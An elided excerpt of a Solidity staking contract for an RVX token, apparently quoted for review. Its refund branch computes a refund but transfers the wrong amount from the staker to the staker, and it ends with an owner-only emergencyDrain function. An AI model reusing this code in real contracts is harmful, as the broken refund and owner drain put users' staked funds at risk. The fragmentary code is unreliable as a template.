...
contract LoSv3 is Ownable {
    ...
    uint256 public constant ONE_MONTH = 31 days;
    uint256 public immutable DEPOSIT_TIME;
    uint256 public constant REWARD_PERC = 15; //15 %
    address private rewardAddress = 0x931Ea36dC76A63a05007Bb315c0f6EF01a5D415f;

    IERC20 immutable RVXToken;
    ...
    modifier _realAddress(address addr) {
        require(addr != address(0), "Error: zero address");
        _;
    }
    ...
    constructor(
        ...
        name = name_;
        tokenAddress = 0x91d6f6e9026E43240ce6F06Af6a4b33129EBdE94;
        RVXToken = IERC20(0x91d6f6e9026E43240ce6F06Af6a4b33129EBdE94);
        DEPOSIT_TIME = ONE_MONTH.mul(3);
        stakingStarts = 1610964000; // Monday, January 18, 2021 11:00:00 AM GMT+01:00
        stakingEnds = 1613383140; // Monday, February 15, 2021 10:59:00 AM GMT+01:00
        stakingCap = 5300000 ether; //5.3mil RVX
    }
    ...
    function _withdrawAfterClose(address from, uint256 amount) private {
        ...
        RVXToken.safeTransferFrom(rewardAddress, from, reward); //transfer Reward
        RVXToken.safeTransfer(from, amount); //transfer initial stake
        ...
        _before(stakingEnds)
    {
        ...
        RVXToken.safeTransferFrom(staker, address(this), remaining);

        if (remaining < amount) {
            // Return the unstaked amount to sender (from allowance)
            uint256 refund = amount.sub(remaining);
            RVXToken.safeTransferFrom(staker, staker, remaining);
      ...
      function emergencyDrain(address _addy) public onlyOwner{
